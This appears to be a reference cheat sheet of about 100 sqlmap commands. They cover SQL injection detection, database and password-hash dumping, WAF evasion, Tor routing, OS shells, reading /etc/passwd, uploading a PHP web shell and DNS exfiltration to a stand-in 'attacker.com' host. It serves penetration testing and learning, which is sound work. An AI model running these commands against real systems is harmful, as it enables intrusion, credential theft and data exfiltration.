# sqlmap

> Automates detection and exploitation of SQL injection: fingerprints the database, extracts data and can reach the file system or OS.

- Category: Web
- Commands: 100
- Page: https://terminal.rokibulroni.com/tool/web/sqlmap
- Homepage: https://sqlmap.org
- Documentation: https://github.com/sqlmapproject/sqlmap/wiki/Usage
- Tags: SQL injection, databases, exploitation

## Install

- apt: `sudo apt install sqlmap`
- brew: `brew install sqlmap`
- pipx: `pipx install sqlmap`

## Basic SQL Injection Detection

### sqlmap -u "http://example.com/page.php?id=1"

```bash
sqlmap -u "http://example.com/page.php?id=1"
```

Tests the specified URL parameter for basic SQL injection vulnerabilities.

### sqlmap -u "http://example.com/page.php?id=1" --batch

```bash
sqlmap -u "http://example.com/page.php?id=1" --batch
```

Runs sqlmap in non-interactive mode using default answers.


## Request File Injection

### sqlmap -r request.txt

```bash
sqlmap -r request.txt
```

Loads the HTTP request from a text file and tests all parameters.


## Direct Connection

### sqlmap -d "mysql://user:password@192.168.1.1:3306/db_name"

```bash
sqlmap -d "mysql://user:password@192.168.1.1:3306/db_name"
```

Connects directly to the database using credentials.


## Google Dorking

### sqlmap -g "inurl:php?id="

```bash
sqlmap -g "inurl:php?id="
```

Uses Google dorks to find potential targets automatically.


## POST Data Injection

### sqlmap -u "http://example.com/login.php" --data="user=admin&pass=123"

```bash
sqlmap -u "http://example.com/login.php" --data="user=admin&pass=123"
```

Tests POST data parameters for SQL injection.


## Cookie Injection

### sqlmap -u "http://example.com/" --cookie="PHPSESSID=123"

```bash
sqlmap -u "http://example.com/" --cookie="PHPSESSID=123"
```

Tests the Cookie header for SQL injection vulnerabilities.


## User-Agent Injection

### sqlmap -u "http://example.com/" --user-agent="SQLMAP"

```bash
sqlmap -u "http://example.com/" --user-agent="SQLMAP"
```

Sets a custom User-Agent header to test for header-based injection.


## Parameter Splitting

### sqlmap -u "http://example.com/" --param-del=";"

```bash
sqlmap -u "http://example.com/" --param-del=";"
```

Sets a custom character to split parameter values.


## Force DBMS

### sqlmap -u "http://example.com/" --dbms="MySQL"

```bash
sqlmap -u "http://example.com/" --dbms="MySQL"
```

Forces the backend DBMS to a specific type to speed up detection.


## Force OS

### sqlmap -u "http://example.com/" --os="Linux"

```bash
sqlmap -u "http://example.com/" --os="Linux"
```

Forces the backend operating system to a specific type.


## Enumeration

### sqlmap -u "http://example.com/" --banner

```bash
sqlmap -u "http://example.com/" --banner
```

Retrieves the database management system banner.

### sqlmap -u "http://example.com/" --current-user

```bash
sqlmap -u "http://example.com/" --current-user
```

Retrieves the database user currently running the query.

### sqlmap -u "http://example.com/" --current-db

```bash
sqlmap -u "http://example.com/" --current-db
```

Retrieves the name of the current database.

### sqlmap -u "http://example.com/" --is-dba

```bash
sqlmap -u "http://example.com/" --is-dba
```

Checks if the current database user is a database administrator.

### sqlmap -u "http://example.com/" --users

```bash
sqlmap -u "http://example.com/" --users
```

Enumerates all database users.

### sqlmap -u "http://example.com/" --passwords

```bash
sqlmap -u "http://example.com/" --passwords
```

Enumerates database user password hashes.

### sqlmap -u "http://example.com/" --privileges

```bash
sqlmap -u "http://example.com/" --privileges
```

Enumerates privileges for database users.

### sqlmap -u "http://example.com/" --roles

```bash
sqlmap -u "http://example.com/" --roles
```

Enumerates roles for database users.

### sqlmap -u "http://example.com/" --dbs

```bash
sqlmap -u "http://example.com/" --dbs
```

Enumerates all databases available on the server.

### sqlmap -u "http://example.com/" -D testdb --tables

```bash
sqlmap -u "http://example.com/" -D testdb --tables
```

Enumerates all tables within the specified database.

### sqlmap -u "http://example.com/" -D testdb -T users --columns

```bash
sqlmap -u "http://example.com/" -D testdb -T users --columns
```

Enumerates all columns within the specified table.

### sqlmap -u "http://example.com/" -D testdb -T users --dump

```bash
sqlmap -u "http://example.com/" -D testdb -T users --dump
```

Dumps all data from the specified table.

### sqlmap -u "http://example.com/" -D testdb -T users -C "user,pass" --dump

```bash
sqlmap -u "http://example.com/" -D testdb -T users -C "user,pass" --dump
```

Dumps specific columns from the table.

### sqlmap -u "http://example.com/" --dump-all

```bash
sqlmap -u "http://example.com/" --dump-all
```

Dumps the entire database content.

### sqlmap -u "http://example.com/" --exclude-sysdbs

```bash
sqlmap -u "http://example.com/" --exclude-sysdbs
```

Excludes system databases when enumerating tables.


## Filtering

### sqlmap -u "http://example.com/" -D testdb -T users --dump --start=1 --stop=10

```bash
sqlmap -u "http://example.com/" -D testdb -T users --dump --start=1 --stop=10
```

Dumps only the first 10 rows from the table.

### sqlmap -u "http://example.com/" -D testdb -T users --dump --where="id>5"

```bash
sqlmap -u "http://example.com/" -D testdb -T users --dump --where="id>5"
```

Dumps rows that match a specific condition.


## Advanced Injection Techniques

### sqlmap -u "http://example.com/" --technique=B

```bash
sqlmap -u "http://example.com/" --technique=B
```

Restricts testing to Boolean-based blind injection only.

### sqlmap -u "http://example.com/" --technique=E

```bash
sqlmap -u "http://example.com/" --technique=E
```

Restricts testing to Error-based injection only.

### sqlmap -u "http://example.com/" --technique=U

```bash
sqlmap -u "http://example.com/" --technique=U
```

Restricts testing to Union-based injection only.

### sqlmap -u "http://example.com/" --technique=S

```bash
sqlmap -u "http://example.com/" --technique=S
```

Restricts testing to Stacked queries injection only.

### sqlmap -u "http://example.com/" --technique=T

```bash
sqlmap -u "http://example.com/" --technique=T
```

Restricts testing to Time-based blind injection only.

### sqlmap -u "http://example.com/" --technique=Q

```bash
sqlmap -u "http://example.com/" --technique=Q
```

Restricts testing to Inline query injection only.

### sqlmap -u "http://example.com/" --time-sec=10

```bash
sqlmap -u "http://example.com/" --time-sec=10
```

Sets the delay for time-based injection to 10 seconds.

### sqlmap -u "http://example.com/" --union-cols=5

```bash
sqlmap -u "http://example.com/" --union-cols=5
```

Specifies the exact number of columns for UNION query testing.

### sqlmap -u "http://example.com/" --union-char="1"

```bash
sqlmap -u "http://example.com/" --union-char="1"
```

Specifies the character to use for bruteforcing number of columns.


## Risk and Level

### sqlmap -u "http://example.com/" --level=3

```bash
sqlmap -u "http://example.com/" --level=3
```

Increases test level to check headers like Cookie and User-Agent.

### sqlmap -u "http://example.com/" --level=5

```bash
sqlmap -u "http://example.com/" --level=5
```

Sets maximum test level to check all headers and parameters.

### sqlmap -u "http://example.com/" --risk=3

```bash
sqlmap -u "http://example.com/" --risk=3
```

Increases risk level to include OR-based and heavy query tests.


## Performance

### sqlmap -u "http://example.com/" --threads=10

```bash
sqlmap -u "http://example.com/" --threads=10
```

Sets the maximum number of concurrent HTTP requests.

### sqlmap -u "http://example.com/" --null-connection

```bash
sqlmap -u "http://example.com/" --null-connection
```

Retrieves page length without body to save bandwidth.

### sqlmap -u "http://example.com/" --keep-alive

```bash
sqlmap -u "http://example.com/" --keep-alive
```

Uses persistent HTTP(s) connections.

### sqlmap -u "http://example.com/" --predict-output

```bash
sqlmap -u "http://example.com/" --predict-output
```

Predicts common output values to reduce requests.


## WAF Evasion

### sqlmap -u "http://example.com/" --tamper="space2comment"

```bash
sqlmap -u "http://example.com/" --tamper="space2comment"
```

Replaces spaces with comments to bypass WAF filters.

### sqlmap -u "http://example.com/" --tamper="between"

```bash
sqlmap -u "http://example.com/" --tamper="between"
```

Replaces greater/less than operators with SQL BETWEEN clause.

### sqlmap -u "http://example.com/" --tamper="charencode"

```bash
sqlmap -u "http://example.com/" --tamper="charencode"
```

URL-encodes all characters in the payload.

### sqlmap -u "http://example.com/" --tamper="charunicodeencode"

```bash
sqlmap -u "http://example.com/" --tamper="charunicodeencode"
```

Unicode-encodes non-standard characters.

### sqlmap -u "http://example.com/" --skip-waf

```bash
sqlmap -u "http://example.com/" --skip-waf
```

Skips heuristic WAF detection checks.

### sqlmap -u "http://example.com/" --random-agent

```bash
sqlmap -u "http://example.com/" --random-agent
```

Uses a randomly selected User-Agent for each session.

### sqlmap -u "http://example.com/" --delay=2

```bash
sqlmap -u "http://example.com/" --delay=2
```

Adds a delay between each HTTP request to avoid rate limiting.


## Authentication

### sqlmap -u "http://example.com/" --auth-type=Basic --auth-cred="admin:admin"

```bash
sqlmap -u "http://example.com/" --auth-type=Basic --auth-cred="admin:admin"
```

Uses Basic HTTP authentication.

### sqlmap -u "http://example.com/" --auth-file="auth.pem"

```bash
sqlmap -u "http://example.com/" --auth-file="auth.pem"
```

Uses a client certificate file for authentication.


## Network Configuration

### sqlmap -u "http://example.com/" --proxy="http://127.0.0.1:8080"

```bash
sqlmap -u "http://example.com/" --proxy="http://127.0.0.1:8080"
```

Routes traffic through a specified HTTP proxy.

### sqlmap -u "http://example.com/" --tor

```bash
sqlmap -u "http://example.com/" --tor
```

Routes traffic through the Tor anonymity network.

### sqlmap -u "http://example.com/" --tor-type=SOCKS5

```bash
sqlmap -u "http://example.com/" --tor-type=SOCKS5
```

Specifies the Tor proxy type as SOCKS5.

### sqlmap -u "http://example.com/" --check-tor

```bash
sqlmap -u "http://example.com/" --check-tor
```

Checks if the Tor connection is working properly.

### sqlmap -u "http://example.com/" --force-ssl

```bash
sqlmap -u "http://example.com/" --force-ssl
```

Forces usage of SSL/HTTPS.


## OS Interaction

### sqlmap -u "http://example.com/" --os-cmd=whoami

```bash
sqlmap -u "http://example.com/" --os-cmd=whoami
```

Executes a single operating system command.

### sqlmap -u "http://example.com/" --os-shell

```bash
sqlmap -u "http://example.com/" --os-shell
```

Prompts for an interactive operating system shell.

### sqlmap -u "http://example.com/" --os-pwn

```bash
sqlmap -u "http://example.com/" --os-pwn
```

Prompts for an out-of-band shell via Meterpreter or VNC.

### sqlmap -u "http://example.com/" --os-smb

```bash
sqlmap -u "http://example.com/" --os-smb
```

One-click prompt for an OOB shell, Meterpreter or VNC via SMB.

### sqlmap -u "http://example.com/" --os-bof

```bash
sqlmap -u "http://example.com/" --os-bof
```

Attempts to exploit stored procedure buffer overflows.

### sqlmap -u "http://example.com/" --priv-esc

```bash
sqlmap -u "http://example.com/" --priv-esc
```

Attempts to escalate database process privileges.


## File System Access

### sqlmap -u "http://example.com/" --file-read="/etc/passwd"

```bash
sqlmap -u "http://example.com/" --file-read="/etc/passwd"
```

Reads a file from the database server file system.

### sqlmap -u "http://example.com/" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

```bash
sqlmap -u "http://example.com/" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

Uploads a local file to the database server file system.


## Advanced Access

### sqlmap -u "http://example.com/" --sql-shell

```bash
sqlmap -u "http://example.com/" --sql-shell
```

Provides an interactive SQL prompt.

### sqlmap -u "http://example.com/" --sql-query="SELECT version()"

```bash
sqlmap -u "http://example.com/" --sql-query="SELECT version()"
```

Executes a single arbitrary SQL query.

### sqlmap -u "http://example.com/" --reg-read

```bash
sqlmap -u "http://example.com/" --reg-read
```

Reads a Windows registry key value.

### sqlmap -u "http://example.com/" --reg-add

```bash
sqlmap -u "http://example.com/" --reg-add
```

Writes a Windows registry key value data.

### sqlmap -u "http://example.com/" --reg-del

```bash
sqlmap -u "http://example.com/" --reg-del
```

Deletes a Windows registry key value.


## Data Exfiltration

### sqlmap -u "http://example.com/" --dns-domain="attacker.com"

```bash
sqlmap -u "http://example.com/" --dns-domain="attacker.com"
```

Uses DNS exfiltration for data retrieval.


## General Options

### sqlmap -u "http://example.com/" -v 3

```bash
sqlmap -u "http://example.com/" -v 3
```

Sets verbosity level to show payloads.

### sqlmap -u "http://example.com/" -v 6

```bash
sqlmap -u "http://example.com/" -v 6
```

Sets verbosity level to trace all HTTP traffic.

### sqlmap -u "http://example.com/" --flush-session

```bash
sqlmap -u "http://example.com/" --flush-session
```

Flushes the session file to start fresh.

### sqlmap -u "http://example.com/" --fresh-queries

```bash
sqlmap -u "http://example.com/" --fresh-queries
```

Ignores query results stored in the session file.

### sqlmap -u "http://example.com/" --save=config.ini

```bash
sqlmap -u "http://example.com/" --save=config.ini
```

Saves the current configuration to an INI file.

### sqlmap -c config.ini

```bash
sqlmap -c config.ini
```

Loads options from a configuration INI file.

### sqlmap --update

```bash
sqlmap --update
```

Updates sqlmap to the latest version.

### sqlmap --purge

```bash
sqlmap --purge
```

Safely removes all content from the sqlmap data directory.

### sqlmap --dependencies

```bash
sqlmap --dependencies
```

Checks for missing third-party dependencies.


## Output Control

### sqlmap -u "http://example.com/" --batch --results-file=results.csv

```bash
sqlmap -u "http://example.com/" --batch --results-file=results.csv
```

Saves results to a CSV file.

### sqlmap -u "http://example.com/" --dump-format=HTML

```bash
sqlmap -u "http://example.com/" --dump-format=HTML
```

Dumps data in HTML format.

### sqlmap -u "http://example.com/" --dump-format=SQLITE

```bash
sqlmap -u "http://example.com/" --dump-format=SQLITE
```

Dumps data into a SQLite database file.


## Advanced Tuning

### sqlmap -u "http://example.com/" --hpp

```bash
sqlmap -u "http://example.com/" --hpp
```

Uses HTTP parameter pollution method.

### sqlmap -u "http://example.com/" --skip-urlencode

```bash
sqlmap -u "http://example.com/" --skip-urlencode
```

Skips URL encoding of payload data.

### sqlmap -u "http://example.com/" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"

```bash
sqlmap -u "http://example.com/" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
```

Evaluates Python code before the request.

### sqlmap -u "http://example.com/" --scope="example.com"

```bash
sqlmap -u "http://example.com/" --scope="example.com"
```

Regulates targets based on a regex scope.

### sqlmap -m targets.txt

```bash
sqlmap -m targets.txt
```

Scans multiple targets listed in a text file.


## Enumeration

### sqlmap -u "http://example.com/" --count

```bash
sqlmap -u "http://example.com/" --count
```

Retrieves the number of entries for tables.

### sqlmap -u "http://example.com/" --schema

```bash
sqlmap -u "http://example.com/" --schema
```

Enumerates the database schema.


## Brute Force

### sqlmap -u "http://example.com/" --common-tables

```bash
sqlmap -u "http://example.com/" --common-tables
```

Checks for existence of common tables using a wordlist.

### sqlmap -u "http://example.com/" --common-columns

```bash
sqlmap -u "http://example.com/" --common-columns
```

Checks for existence of common columns using a wordlist.

### sqlmap -u "http://example.com/" --common-files

```bash
sqlmap -u "http://example.com/" --common-files
```

Checks for existence of common files on the file system.


## Injection Point

### sqlmap -u "http://example.com/item/1*"

```bash
sqlmap -u "http://example.com/item/1*"
```

Uses the asterisk to manually mark the injection point.

### sqlmap -u "http://example.com/" --skip="user-agent"

```bash
sqlmap -u "http://example.com/" --skip="user-agent"
```

Skips testing of the specified parameter.

### sqlmap -u "http://example.com/" --param-exclude="token"

```bash
sqlmap -u "http://example.com/" --param-exclude="token"
```

Excludes parameters from testing based on regex.


## Crawling

### sqlmap -u "http://example.com/" --crawl=2

```bash
sqlmap -u "http://example.com/" --crawl=2
```

Crawls the website to a depth of 2 to find targets.

### sqlmap -u "http://example.com/" --crawl-exclude="logout"

```bash
sqlmap -u "http://example.com/" --crawl-exclude="logout"
```

Excludes specific pages from crawling based on regex.


## Cleanup

### sqlmap -u "http://example.com/" --cleanup

```bash
sqlmap -u "http://example.com/" --cleanup
```

Removes tables or functions created by sqlmap.

## Related tools

- [XSSer](https://terminal.rokibulroni.com/tool/web/xsser)
- [ffuf](https://terminal.rokibulroni.com/tool/web/ffuf)
- [Nuclei](https://terminal.rokibulroni.com/tool/web/nuclei)
